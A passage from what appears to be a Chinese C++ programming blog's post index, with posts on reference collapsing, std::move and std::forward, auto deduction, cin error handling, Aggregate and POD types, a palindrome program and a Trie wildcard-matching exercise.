对非引用Widget使用std::remove_reference会产生原来的类型（Widget），所以std::forward变成这样： 12Widget&amp;&amp; forward(Widget&amp; param)&#123; return static_cast&lt;Widget&amp;&amp;&gt;(param); &#125; 这里没有对引用的引用，所以没有进行引用折叠，这也就这次std::forward调用的最终实例化版本。 由函数返回的右值引用被定义为右值，所以在这种情况下，std::forward会把f的参数fParam（一个左值）转换成一个右值。最终结果是传递给函数f的右值实参作为右值被转发到someFunc函数，这是顺理成章的事情。 在C++14中，std::remove_reference_t的存在可以让std::forward的实现变得更简洁： 12345template&lt;typename T&gt; // C++14，在命名空间std中T&amp;&amp; forward(remove_reference_t&lt;T&gt;&amp; param)&#123; return static_cast&lt;T&amp;&amp;&gt;(param);&#125; 引用折叠出现在四种上下文。第一种是最常见的，就是模板实例化。第二种是auto变量的类型生成。它的细节本质上和模板实例化相同，因为auto变量的类型推断和模板类型推断本质上相同（看条款2）。再次看回之前的一个例子： 12345678910template&lt;typename T&gt;void func(T&amp;&amp; param);Widget widgetFactory(); // 返回右值的函数Widget w; // 一个变量，左值func(w); // 用左值调用函数，T被推断为Widget&amp;func(widgetFactory()); // 用右值调用函数，T被推断为Widget 这可以用auto形式模仿。这声明 1auto&amp;&amp; w1 = w; 用个左值初始化w1，因此auto被推断为Widget&amp;。在声明中用Widget&amp;代替auto声明w1，产生这个对引用进行引用的代码， 1Widget&amp; &amp;&amp; w1 = w; 这在引用折叠之后，变成 1Widget&amp; w1 = w; 结果是，w1是个左值引用。 另一方面，这个声明 1auto&amp;&amp; w2 = widgetFactory(); 用个右值初始化w2，导致auto被推断为无引用类型Widget，然后用Widget替代auto变成这样： 1Widget&amp;&amp; w2 = widgetFactory(); 这里没有对引用的引用，所以我们已经完成了，w2是个右值引用。 我们现在处于真正能理解条款24介绍通用引用的位置了。通用引用不是一种新的引用类型，实际上它是右值引用——在满足了下面两个条件的上下文中： 根据左值和右值来进行类型推断。T类型的左值使T被推断为T&amp;，T类型的右值使T被推断为T。 发生引用折叠 通用引用的概念是很有用的，因为它让你免受：识别出存在引用折叠的上下文，弱智地根据左值和右值推断上下文，然后弱智地把推断出的类型代进上下文，最后使用引用折叠规则。 我说过有4中这样的上下文，不过我们只讨论了两种：模板实例化和auto类型生成。第三种上下文就是使用typedef和类型别名声明（看条款9）。如果，在typedef创建或者评估期间，出现了对引用的引用，引用折叠会出面消除它们。例如，假如我们有个类模板Widget，内部嵌有一个右值引用类型的typedef， 123456template&lt;typename T&gt;class Widget &#123;public: typedef T&amp;&amp; RvalueRefToT; ...&#125;; 然后假如我们用一个左值引用来实例化Widget： 1Widget&lt;int&amp;&gt; w; 在Widget中用int&amp;代替T，typedef变成这样： 1typedef int&amp; &amp;&amp; RvalueRefToT; 引用折叠把代码弄出这样： 1type int&amp; RvalueRefToT; 这很明显的告诉我们，我们typedef选择的名字跟我们期望得到的不一样：当用左值引用实例化Widget时，RvalueRefToT是个左值引用的typedef。 最后的一种会发生引用折叠的上下文是使用decltype中。如果，在分析一个使用decltype的类型期间，出现了对引用的引用，引用折叠会出面消除它。（关于decltype的详细信息，请看条款3。） 总结需要记住的3点： 引用折叠会出现在4中上下文：模板实例化，auto类型生成，typedef和类型别名声明的创建和使用，decltype。 当编译器在一个引用折叠上下文中生成了对引用的引用时，结果会变成一个引用。如果原来的引用中有一个是左值引用，结果就是个左值引用。否则，结果是个右值引用。 通用引用是——出现在类型推断区分左值和右值和出现引用折叠的上下文中的——右值引用。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"转载","slug":"转载","permalink":"http://coordinate.wang/tags/转载/"},{"name":"引用折叠","slug":"引用折叠","permalink":"http://coordinate.wang/tags/引用折叠/"}]},{"title":"auto,auto& 和 auto&&","slug":"2017-07-07-auto,auto&和auto&&","date":"2017-07-06T16:00:00.000Z","updated":"2018-02-18T03:29:06.902Z","comments":true,"path":"2017/07/07/2017-07-07-auto,auto&和auto&&/","link":"","permalink":"http://coordinate.wang/2017/07/07/2017-07-07-auto,auto&和auto&&/","excerpt":"","text":"auto and auto&amp;&amp; cover most of the cases: Use auto when you need a local copy. This will never produce a reference. The copy (or move) constructor must exist, but it might not get called, due to the copy elision optimization. Use auto&amp;&amp; when you don’t care if the object is local or not. Technically, this will always produce a reference, but if the initializer is a temporary (e.g., the function returns by value), it will behave essentially like your own local object. Also, auto&amp;&amp; doesn’t guarantee that the object will be modifiable, either. Given a const object or reference, it will deduce const. However, modifiability is often assumed, given the specific context. auto&amp; and auto const &amp; are a little more specific: auto&amp; guarantees that you are sharing the variable with something else. It is always a reference and never to a temporary. auto const &amp; is like auto&amp;&amp;, but provides read-only access. What about for primitive/non-primitive types?There is no difference. Does this also apply to range based for loops?Yes. Applying the above principles, Use auto&amp;&amp; for the ability to modify and discard values of the sequence within the loop. (That is, unless the container provides a read-only view, such as std::initializer_list, in which case it will be effectively an auto const &amp;.) Use auto&amp; to modify the values of the sequence in a meaningful way. Use auto const &amp; for read-only access. Use auto to work with (modifiable) copies. You also mention auto const with no reference. This works, but it’s not very commonly used because there is seldom an advantage to read-only access to something that you already own.","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"转载","slug":"转载","permalink":"http://coordinate.wang/tags/转载/"},{"name":"auto","slug":"auto","permalink":"http://coordinate.wang/tags/auto/"},{"name":"auto&","slug":"auto","permalink":"http://coordinate.wang/tags/auto/"},{"name":"auto&&","slug":"auto","permalink":"http://coordinate.wang/tags/auto/"}]},{"title":"关于cin的一些问题","slug":"2017-07-05-关于cin的一些问题","date":"2017-07-04T16:00:00.000Z","updated":"2018-02-18T03:29:06.884Z","comments":true,"path":"2017/07/05/2017-07-05-关于cin的一些问题/","link":"","permalink":"http://coordinate.wang/2017/07/05/2017-07-05-关于cin的一些问题/","excerpt":"","text":"第一次看到cin.clear()这东西，很多人以为就是清空cin里面的数据流,而实际上却与此相差很远，首先我们看看以下代码： 1234567891011121314151617#include &lt;iostream&gt; using namespace std; int main() &#123; int a; cin &gt;&gt; a; cout &lt;&lt; cin.rdstate() &lt;&lt; endl; if(cin.rdstate() == iOS::goodbit) &#123; cout &lt;&lt; \"输入数据的类型正确，无错误！\" &lt;&lt; endl; &#125; if(cin.rdstate() == ios_base::failbit) &#123; cout &lt;&lt; \"输入数据类型错误，非致命错误，可清除输入缓冲区挽回！\" &lt;&lt; endl; &#125; system(\"pause\"); &#125; 我们定义要输入到的变量是整型，但如果我们输入了英文字母或者汉字,那就会发生错误，cin里有个方法能检测这个错误,就是cin.rdstate();当cin.rdstate()返回0(即ios::goodbit)时表示无错误，可以继续输入或者操作，若返回4则发生非致命错误即ios::failbit，则不能继续输入或操作。而cin.clear则可以控制我们此时cin里对这个问题的一个标识。语法如下： 1cin.clear(标识符); 标识符号为： goodbit无错误 Eofbit已到达文件尾 failbit非致命的输入/输出错误，可挽回 badbit致命的输入/输出错误，无法挽回 若在输入输出类里。需要加ios::标识符号通过cin.clear()，我们能确认它的内部标识符，如果输入错误则能重新输入。结合真正的清空数据流方法cin.sync()，请看下例： 12345678910111213141516171819202122#include &lt;iostream&gt; using namespace std; int main() &#123; int a; while(1) &#123; cin &gt;&gt; a; if(!cin) //条件可改写为cin.fail() &#123; cout &lt;&lt; \"输入有错!请重新输入\" &lt;&lt; endl; cin.clear(); cin.sync(); //清空流 &#125; else &#123; cout &lt;&lt; a; break; &#125; &#125; system(\"pause\"); &#125; 上面的cin默认参数为0，即无错误，正常操作。当我们输入英文字母’k’时，它的状态标识改为fail（即1），即错误，用cout对用户输出信息，再用cin.clear让错误标识改回为0，让我们可以继续输入，再清空流数据继续输入。如果我们没有了cin.clear，则会进入死循环，其过程为我们输入了英文字母，它的状态标识便为fail，当运行到条件判断时，便总是回到错误的条件表示里，并且我们再也没办法输入，因为错误的表示关闭了cin，所以会进入死循环。 自己再添加一句：如果输入错误，则再也输入不进去，须用clear。而sync用于清除当前输入缓冲区中的内容。 123456789101112131415#include &lt;iostream&gt;int main()&#123; using namespace std; int a; cin &gt;&gt; a; cout &lt;&lt; a &lt;&lt;endl; cin &gt;&gt; a ; cout &lt;&lt; a &lt;&lt;endl; cin.clear(); cin.sync(); // 可以将cin.clear();cin.sync(); 不同时注释掉试一下就知道了 cin &gt;&gt; a; cout &lt;&lt; a &lt;&lt;endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"cin","slug":"cin","permalink":"http://coordinate.wang/tags/cin/"}]},{"title":"Trie树（模糊匹配）","slug":"2017-07-04-Trie树（模糊匹配）","date":"2017-07-03T16:00:00.000Z","updated":"2018-02-18T03:29:06.884Z","comments":true,"path":"2017/07/04/2017-07-04-Trie树（模糊匹配）/","link":"","permalink":"http://coordinate.wang/2017/07/04/2017-07-04-Trie树（模糊匹配）/","excerpt":"","text":"Wild Words Time Limit: 2000MS Memory Limit: 65536K DescriptionA word is a string of lowercases. A word pattern is a string of lowercases, ‘?’s and ‘*‘s. In a pattern, a ‘?’ matches any single lowercase, and a ‘*‘ matches none or more lowercases.There are many word patterns and some words in your hand. For each word, your task is to tell which patterns match it.InputThe first line of input contains two integers N (0 &lt; N &lt;= 100000) and M (0 &lt; M &lt;=100), representing the number of word patterns and the number of words. Each of the following N lines contains a word pattern, assuming all the patterns are numbered from 0 to N-1. After those, each of the last M lines contains a word.You can assume that the length of patterns will not exceed 6, and the length of words will not exceed 20.OutputFor each word, print a line contains the numbers of matched patterns by increasing order. Each number is followed by a single blank. If there is no pattern that can match the word, print “Not match”. Sample Input 123456789105 4t*?h*s??e**s?*ethistheanis Sample Output 12340 1 3 0 2 4 Not match3","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"trie树","slug":"trie树","permalink":"http://coordinate.wang/tags/trie树/"},{"name":"字典树","slug":"字典树","permalink":"http://coordinate.wang/tags/字典树/"},{"name":"oj","slug":"oj","permalink":"http://coordinate.wang/tags/oj/"}]},{"title":"回文字符串","slug":"2017-07-03-回文字符串","date":"2017-07-02T16:00:00.000Z","updated":"2018-02-18T03:29:06.868Z","comments":true,"path":"2017/07/03/2017-07-03-回文字符串/","link":"","permalink":"http://coordinate.wang/2017/07/03/2017-07-03-回文字符串/","excerpt":"","text":"写一个程序，他用一个stack容器适配器实例将从键盘输入的一行文字反向。程序应该输出反向后的结果，并判断和原始字符串是否回文（回文字符串是一个正向和反向都相同的字符串—-如果忽略空格和标点的话，例如Are we not drawn onward to a new era?） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;stack&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;string&gt;#include &lt;stdexcept&gt;#include &lt;iterator&gt;using namespace std;int fun(int low, int high, string str, int index)&#123; if (index == 0 || index == 1) &#123; return 1; &#125; if (str.at(low) != str.at(high)) &#123; return 0; &#125; return fun(low + 1, high - 1, str, index - 2);&#125;int main()&#123; stack&lt;char&gt; words; bool flag&#123;&#125;; string exp; try &#123; while (true) &#123; size_t index&#123;&#125;; getline(cin, exp, '\\n'); if (exp.empty()) break; while (index != exp.length()) &#123; words.push(exp.at(index++)); &#125; exp.erase(remove(begin(exp), end(exp), ' '), end(exp)); exp.erase(remove(begin(exp), end(exp), '?'), end(exp)); exp.erase(remove(begin(exp), end(exp), ','), end(exp)); exp.erase(remove(begin(exp), end(exp), '.'), end(exp)); while (!words.empty()) &#123; cout &lt;&lt; words.top(); words.pop(); &#125; index = exp.length(); if (fun(0, index - 1, exp, index)) &#123; cout &lt;&lt; \" OK\" &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \" NO\" &lt;&lt; endl; &#125; &#125; &#125; catch (const exception&amp; e) &#123; cerr &lt;&lt; e.what() &lt;&lt; endl; &#125; system(\"pause\");&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"回文字符串","slug":"回文字符串","permalink":"http://coordinate.wang/tags/回文字符串/"}]},{"title":"Aggregate和POD类型","slug":"2017-07-02-Aggregate和POD类型","date":"2017-07-01T16:00:00.000Z","updated":"2018-02-18T03:29:06.868Z","comments":true,"path":"2017/07/02/2017-07-02-Aggregate和POD类型/","link":"","permalink":"http://coordinate.wang/2017/07/02/2017-07-02-Aggregate和POD类型/","excerpt":"","text":"A plain old data structure (POD) is a data structure that is represented only as passive collections of field values, without using encapsulation or other object-oriented features.POD是这样的数据结构：用组个field的集合来表示，没有使用封装或者其他面向对象的features。A POD type in C++ is defined as either a scalar type or a POD class. A POD class has no user-defined copy assignment operator, no user-defined destructor, and no non-static data members that are not themselves PODs. Moreover, a POD class must be an aggregate, meaning it has no user-declared constructors, no private nor protected non-static data, no base classes and no virtual functions. The standard includes statements about how PODs must behave in C++.In certain contexts, C++ allows only POD types to be used. For example, a union in C++98 cannot contain a class that has virtual functions or nontrivial constructors or destructors. This restriction is imposed because the compiler cannot determine which constructor or destructor should be called for a union. POD types can also be used for interfacing with C, which supports only PODs.在C++中，我们把传统的C风格的struct叫做POD（Plain Old Data）对象。一般来说，POD对象应该满足如下特性。对于POD类型T的对象，不管这个对象是否拥有类型T的有效值，如果将该对象的底层字节序列复制到一个字符数组（或者无符号字符数组）中，再将其复制回对象，那么该对象的值与原始值一样。考试就到对于任意的POD类型T，如果两个T指针分别指向两个不同的对象obj1和obj2，如果用memcpy库函数把obj1的值复制到obj2，那么obj2将拥有与obj1相同的值。简言之，针对POD对象，其二进制内容是可以随便复制的，在任何地方，只要其二进制内容在，就能还原出正确无误的POD对象。对于任何POD对象，都可以使用memset()函数或者其他类似的内存初始化函数。 下面是转自stackoverflow的一篇文章的译文，比较详细介绍了aggregate 和 POD：这篇文章很长，如果Aggregates和PODs都想了解，就静下心来完整的把这篇文章读完，如果你仅仅对Aggregates感兴趣，读第一部分就可以了。如果你仅对PODs感兴趣，那你必须先读懂Aggregates的定义、含义和例子，然后再跳去读PODs，但是我依然推荐你完整的读完第一部分。Aggragates的概念是定义PODs的基础。 什么是Aggragates，为什么他们这么特别？C++标准（C++ 03 8.5.1 §1）中的正式定义： 1一个Aggregate是一个数组或者一个没有用户声明构造函数，没有私有或保护类型的非静态数据成员，没有父类和虚函数的类型 现在我们来分析这个定义。首先，数组是Aggregate。class也可以成为Aggregate如果满足…等等！我们还没有说struct和unions，它们可以成为Aggregate吗？是的，他们可以。在C++中，术语class是指所有的classes、structs和unios。所以，class（struct，union）只要满足上面定义中的条件就可以成为Aggregate。这些条件有什么含义呢？ 这并不是说Aggregate类型就不能有构造函数，事实上，它可以拥有一个默认构造函数或者一个复制构造函数，只要他们是被编译器声明的，而不是被用户自己声明的。 不能拥有私有或者保护类型的非静态数据成员。你可以定义任意多的私有或者保护类型的成员方法（不包括构造函数）和静态类型的数据成员和方法，这都不违背Aggregate类型的规则。 Aggregate类型可以拥有用户声明的/用户定义的 赋值操作符或者析构函数 数组是Aggregate类型，即便是非Aggregate类型元素的数组。 来看几个例子： 12345678910111213141516171819202122232425class NotAggregate1&#123; virtual void f()&#123;&#125; //remember? no virtual functions&#125;;class NotAggregate2&#123; int x; //x is private by default and non-static &#125;;class NotAggregate3&#123;public: NotAggregate3(int) &#123;&#125; //oops, user-defined constructor&#125;;class Aggregate1&#123;public: NotAggregate1 member1; //ok, public member Aggregate1&amp; operator = (Aggregate1 const &amp; rhs) &#123;/* */&#125; //ok, copy-assignment private: void f() &#123;&#125; // ok, just a private function&#125;; 你已经理解了Aggregates含义了，现在我们来看为什么它这么特别。他们和非Aggregates类型不同，可以使用“{ }”初始化。这种初始化语法，在数组上很常见，而且，我们刚刚了解到数据就是Aggregates类型，所以，我们从数组开始： 123Type array_name[n] = &#123;a1, a2, ..., am&#125;;if(m == n) 数组的第i个元素被初始化为ai 1else if(m &lt; n) 数组前边的m个元素被初始化为a1, a2, …, am，剩余的n-m个元素，如果可能，将按值初始化（下面有关于这个名词的解释） 1else if(m &gt; n) 会引起编译错误 1else（有可能为这种形式a[] = &#123;1,2,3&#125;;） 数组的长度将被推测为m，所以int a[] = {1,2,3}等于a[3] = {1,2,3}标量类型的(bool,int,char,double,指针)对象是按值初始化（value-initialized）的，意思是指它被初始化为 0 （bool类型被初始化为false， double被初始化为0.0，等等）。有用户声明的默认构造函数的Class类型的对象按值初始化时，他的默认构造函数就会被调用。如果默认构造函数是被隐式定义的，那么所有的非静态类型成员变量将会递归地按值初始化。虽然这个定义并不精确，也不完全正确，但是可以让你有个基本的认识。最近我将会写一篇关于zero-initialization，value-initialization和default-initialization之间区别的文章。引用不能按值初始化。对于非Aggregate类型的class进行按值初始化有可能失败，比如在没有合适的默认构造函数的情形下。数组初始化的例子： 123456789101112131415161718192021class A()&#123; A(int)&#123;&#125; //no default constructor&#125;;class B()&#123; B() &#123;&#125; //default constructor available&#125;;int main()&#123; A a1[3] = &#123;A(2), A(1), A(14)&#125;; //OK n == m A a2[3] = &#123;A(2)&#125;; //ERROR A没有默认构造函数. 不能按值初始化a2[1] 和 a2[2] B b1[3] = &#123;B()&#125;; //OK b1[1]和b1[2]使用默认构造函数按值初始化 int Array1[1000] = &#123;0&#125;; //所有元素被初始化为0 int Array2[1000] = &#123;1&#125;; //注意: 只有第一个元素被初始化为1，其他为0; bool Array3[1000] = &#123;&#125;; //大括号里可以为空，所有元素被初始化为false； int Array4[1000]; //没有被初始化. 这和空&#123;&#125;初始化不同； //这种情形下的元素没有按值初始化，他们的值是未知的，不确定的; //(除非Array4是全局数据) int array[2] = &#123;1,2,3,4&#125;; //ERROR, 太多初始值&#125; 现在我们来看Aggregates类型是如何使用{ }初始化的。和上面非常类似，按照在类内部声明的顺序（按照定义都必须是public类型）初始化非静态类型的成员变量。如果初始值比成员少，那么其他的成员将按值初始化。如果有一个成员无法进行按值初始化，我们将会得到一个编译期错误。如果初始值比成员多，我们同样得到一个编译期错误。 12345678910111213141516struct X&#123; int i1; int i2;&#125;;struct Y&#123; char c; X x; int i[2]; float f; protected: static double d;private: void g()&#123;&#125; &#125;; Y y = &#123;'a', &#123;10,20&#125;, &#123;20,30&#125;&#125;; 上面的例子中，y.c被初始化为’a’，y.x.i1被初始化为10，y.x.i2被初始化为20，y.i[0]为20，y.i[1]为30，y.f被按值初始化，也即是说，被初始化为0.0，保护类型的静态成员变量d不会被初始化，因为它是静态类型的。Aggregate类型的unions有所不同，使用{ }你可能只能初始化它们的第一个成员，我想如果你使用C++高级到考虑使用unions（使用他们非常危险，必须小心谨慎），你一定可以自己在C++标准中找到unions的规则。我们知道了Aggregates的特别之处，现在让我们来尝试理解一下它对类型的限制，也就是说为什么会有这些限制。我们应当理解使用{ }进行成员逐一初始化意味着这一类型只是成员的集合。如果有一个用户定义的构造函数，那意味着用户需要做一些额外的工作来初始化成员，因此使用{ }初始化是不正确的。如果出现了虚函数，那意味着这个类型（大多数实现）有一个指向vtable的指针，需要在构造函数内设置，所以使用{ }初始化是不够的。作为练习，你可以按照这种方式自己理解其他限制的含义。关于Aggregates的就这么多，现在我们可以更严格定义一个子类型PODs 什么是PODs，为什么他们这么特别 C++标准（C++ 03 9 §4）中正式的定义为： 1POD-struct类型是没有非静态类型的non-POD-struct，non-POD-union （或者这些类型的数组）和引用类型的数据成员，也没有用户定义的赋值操作符和析构函数的Aggregate类型的类。类似地，POD-union是没有非静态类型的non-POD-struct，non-POD-union （或者这些类型的数组）和引用类型的数据成员，也没有用户定义的赋值操作符和析构函数的Aggregate类型的联合。POD类型就是POD-struct和 a POD-union中的一种。 Wow，这个定义更难解读，不是吗？让我们吧unions剥离出去，更清晰的复述为： 1POD类型就是没有非静态类型的non-POD类型 （或者这些类型的数组）和引用类型的数据成员，也没有用户定义的赋值操作符和析构函数的Aggregate类型。 这个定义的有什么含义呢？（POD就是Plain Old Data） 所有的POD类型都是Aggregates类型，换句话说，如果不是aggregate类型，那么它一定不是POD类型。 类，和结构体一样可以为POD类型，因为标准中POD-struct这个术语包含了这两种情形。 和Aggregates类型一样，静态成员是什么类型则无关紧要 例子： 123456789101112131415161718struct POD&#123; int x; char y; void f() &#123;&#125; //no harm if there's a function static std::vector&lt;char&gt; v; //static members do not matter&#125;;struct AggregateButNotPOD1&#123; int x; ~AggregateButNotPOD1()&#123;&#125; //user-defined destructor&#125;;struct AggregateButNotPOD2&#123; AggregateButNotPOD1 arrOfNonPod[3]; //array of non-POD class&#125;; POD-classes，POD-unions，标量类型和这些类型的数组合成为POD类型，POD类型在很多方面都很特别，我来举几个例子： POD类型是最接近于C语言中的结构体类型的。他们都没有改变对象的内存布局，但是，POD类型却可以有自己的成员函数和任意类型的静态成员。所以，如果你想写一个可在C甚至.net平台使用的可移植的动态库，你应该让暴露的所有的方法的返回值和参数都会POD类型。 非POD类型的对象的生命周期起始于构造函数，结束于析构函数调用完成。而POD类型对象的生命周期却起始于存储对象的空间被占用，结束于空间被释放或被重复利用。 对于POD类型的对象，C++标准保证当你使用memcpy将对象的内容拷贝到一个char类型或者unsigned char类型的数组中，在使用memcpy拷贝回来的时候，对象会保持不变。特别注意，非POD类型是无法保证这一点的。当然，你也可以安全的在对象之间拷贝POD类型。下面的这个例子假设T为POD类型 1234567#define N sizeof(T)char buf[N];T obj; // obj initialized to its original valuememcpy(buf, &amp;obj, N); // between these two calls to memcpy,// obj might be modifiedmemcpy(&amp;obj, buf, N); // at this point, each subobject of obj of scalar type// holds its original value goto 语句。你知道，使用goto从一个变量没有声明的点跳转到一个变量已经被声明的点是不合法的（编译器应该会有报错）。这个限制仅仅对非POD类型有效，下面这个例子f()是不合法的，而g()则是合法的。注意到微软的编译器对这条规则过于慷慨了，仅仅给出警告而已。 123456789101112131415int f() &#123; struct NonPOD &#123; NonPOD()&#123;&#125;&#125;; goto label; NonPOD x;label: return 0;&#125;int g()&#123; struct POD &#123;int i; char c;&#125;; goto label; POD x;label: return 0;&#125; C++标准保证POD类型的对象在内存起始处没有便宜。也就是说如果一个POD类型A的第一个成员为T，你可以安全的调用reinterpret_cast 从A转换为T,得到第一个成员的指针，反过来也成立。 这个列表还很长很长… 结论理解POD类型非常重要，因为很多C++语言特性，就像你看到的，针对于他们都会有所不同。希望这篇文章对你有用。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"Aggregate","slug":"Aggregate","permalink":"http://coordinate.wang/tags/Aggregate/"},{"name":"POD","slug":"POD","permalink":"http://coordinate.wang/tags/POD/"}]},{"title":"理解std::move和std::forward","slug":"2017-06-22-理解move和forward","date":"2017-06-21T16:00:00.000Z","updated":"2018-02-18T03:29:06.853Z","comments":true,"path":"2017/06/22/2017-06-22-理解move和forward/","link":"","permalink":"http://coordinate.wang/2017/06/22/2017-06-22-理解move和forward/","excerpt":"","text":"转自Effective Modern C++ 条款23 理解std::move和std::forward 首先我要提一下右值与左值，我觉得本书中的一句话说的非常好： A useful heuristic to determine whether an expression is an lvalue is to ask if you can take its address. If you can, it typically is. If you can’t, it’s usually an rvalue. A nice feature of this heuristic is that it helps you remember that the type of an expression is independent of whether the expression is an lvalue or an rvalue. That is, given a type T, you can have lvalues of type T as well as rvalues of type T. It’s especially important to remember this when dealing with a parameter of rvalue reference type, because the parameter itself is an lvalue: 有效了解std::move和std::forward的方法是，了解它们做不了的事情。std::move不会移动任何东西，std::forward不会转发任何东西，在运行期间，它们什么事情都不会做，不会生成一个字节的可执行代码。 std::move和std::forward仅仅是表现为转换类型的函数（实际上是模板函数），std::move无条件地把参数转换为右值，而std::forward在满足条件下才会执行std::move的转换。这个说明导致了一系列问题，但是从根本上，那是一个完整的故事。 为了让故事更具体，这里是C++11的std::move的简单实现，它没有完全覆盖标准库的细节，不过很接近了。 1234567template &lt;typename T&gt; // 在std命名空间里`typename remove_reference&lt;T&gt;::type&amp;&amp;move(T&amp;&amp; param)&#123; using ReturnType = typename remove_reference&lt;T&gt;::type&amp;&amp;; return static_cast&lt;ReturnType&gt;(param);&#125; 其实函数的本质就是类型转换，就如你所见，std::move接收一个对象的引用（准确地说，是通用引用，具体看条款24），然后返回相同对象的引用。 返回类型中的“&amp;&amp;”暗示着std::move返回的是一个右值引用，不过，就像条款28讲述那样，如果T的类型是个左值引用，T&amp;&amp;将会变成左值引用。为了防止这种事发生，我们对T使用了remove_reference（去除引用语义），因此确保了使用“&amp;&amp;”的类型不是引用类型，那就保证了std::move返回的是右值引用，这是很重要的，因为函数返回的右值引用是右值。因此，std::move把参数转换为一个右值，那就是它做的全部事情。 说点题外话，std::move在c++14的实现就没那么夸张了，返回类型推断（看条款3）和标准库的别名模板std::remove_reference_t（看条款9），std::move可以这样写： 123456template &lt;typename T&gt; // C++14，依然在std命名空间decltype(auto) move(T&amp;&amp; param)&#123; using ReturnType = remove_reference_t&lt;T&gt;&amp;&amp;; return static_cast&lt;ReturnType&gt;(param);&#125; 是不是容易看多了？ 因为std::move除了把参数转换为右值，没做其他事情，这表明类似rvalue_cast这样的名字或许更适合它。话虽如此，但我们用的名字是std::move，所以记住std::move做了什么和没做什么是重要的，它做的是转换，不是移动。 当然，右值会成为可移动的候选者，因此对一个对象使用std::move是告诉编译器，这个对象符合被移动的条件。那就是为什么std::move会有这个名字：很容易指出可能被移动的对象。 事实上，右值在通常情况下是唯一的可移动候选者。假如你要写一个代表注释的类，这个类的构造函数接受一个std::string参数（含有注释），然后把参数拷贝到成员变量，根据条款41，你声明的是值传递的参数： 12345class Annotation &#123;public: explicit Annotation(std::string text); // 参数会被拷贝，值传递 ...&#125;; 不过因为注释类只是需要读text的值，不需要修改它，根据尽可能使用const这个悠久的历史，你修改了声明，把text修改成const： 12345class Annotation &#123;public: explicit Annotation(const std::string text); ...&#125;; 为了避免拷贝text到成员变量的开销，你根据条款41的建议，对text使用std::move，由此产生一个右值： 123456789class Annotation &#123;public: explicit Annotation(const std::string text) : value(std::move(text)) // 把text\"移动\"成右值 &#123; ... &#125; // 但这代码的行为跟你看到的不一样 ...private: std::string value;&#125;; 代码编译，链接，运行，把成员变量value设置为text的内容。唯一把这代码和你眼中的完美实现分离的事情是text不是被移动到value的，它只是被拷贝。当然，text被std::move转换为右值了，但是text是被声明为const std::string，所以在转换之前，text是一个const std::string左值，转换后，是一个const std::string右值，在整个过程中，const的性质是一支存在的。 当编译器选择std::string构造函数时，有两个可能： 1234567class string &#123; // std::string实际上是std::basic_string&lt;char&gt;的typedefpublic: ... string(const string&amp; rhs); //拷贝构造 string(string&amp;&amp; rhs); //移动构造 ...&#125;; 在Annotation构造函数的初始化列表中，std::move(text)的结果是一个类型为const std::string的右值，这个右值不能传递给std::string的移动构造函数，因为移动构造函数接受的是non-const std::string的右值引用。不过这右值，可以传递给拷贝构造函数，因为一个lvalue-reference-to-const（const的左值引用）可以绑定const右值。所以，成员初始化列表调用了std::string的拷贝构造函数，即使text被转换成右值！这种行为对于维护const的正确性是必不可少的。把一个值搬离对象通常都会改变这个对象，所以C++不允许把const对象传递给会改变它们（对象）的函数（例如移动构造）。 在这个例子中我们可以得到两个教训。第一，如果你想要有能力移动对象，不要把它们声明为const。向一个const对象请求移动操作会默默转换为拷贝操作。第二，std::move不仅不会移动东西，还不能保证转换出来的对象有被移动的资格。你唯一能确保的事情是：对一个对象使用std::move，那个对象就被转换为右值。 std::forward的故事就比std::move简单多了，不过std::move是无条件把参数转换为右值，而std::forward在特定情况下才会这样做。std::forward是个有条件的类型转换。为了理解它什么时候转换，回忆一下std::forward一般是怎样使用的。最常见用法是一个模板函数接受全局引用，然后用std::forward把参数传递给另一个函数： 1234567891011void process(const Widget&amp; lvalArg); // 处理左值void process(Widget&amp;&amp; rvalArg); // 处理右值template&lt;typename T&gt;void logAndProcess(T&amp;&amp; param) // 把参数传递给process的模板&#123; auto now = std::chrono::system_clock::now(); // 获取当前时间 makeLogEntry(\"Calling 'process'\", now); process(std::forward&lt;T&gt;(param));&#125; 考虑logAndProcess的两次调用，一次左值，一次右值： 1234Widget w;logAndProcess(w); // 左值参数调用logAndProcess(std::move(w)); // 右值参数调用 在logAndProcess里面，参数param被传递给process函数，而process函数为了左值参数和右值参数进行重载。当我们用左值调用logAndProcess的时候，我们自然是希望把左值转发给process，而当我们用右值调用logAndProcess时，我们希望调用的是右值重载的process。 但是param，和所有的函数参数一样，是个左值。在logAndProcess里每次调用process都会使用左值重载的process。为了防止这样的事情，我们需要一项技术，当且仅当初始化param的参数——即传递给logAndProcess的参数——是右值时，在logAndProcess把param转换为右值。这就是std::forward干的事情了，这也是为什么说std::forward是个有条件的类型转换：仅当参数是用右值初始化时，才会把它转换为右值。 你可能想要知道std::forward是如何知道参数是否用右值初始化的。举个例子，上面的代码中，std::forward是怎样知道初始化param的，是左值还是右值呢？简短的答案是信息会被编码到logAndProces的模板参数T中。这个参数传递给std::forward模板，然后恢复编码的信息。具体细节看条款28。 倘若把std::move和std::forward把归结为类型转换，那么它们的差别是std::move总是会转换，std::forward只会在某些时刻转换，你可以会问我们是否可以摒弃std::move，只是用std::forward。从纯粹的技术角度看，答案是可以的：std::forward可以应付所有场景，std::move不是必须的。当然，没有一个函数是真的必须的，因为我们可以自己写转换，不过如果那样的话，是很恶心的。 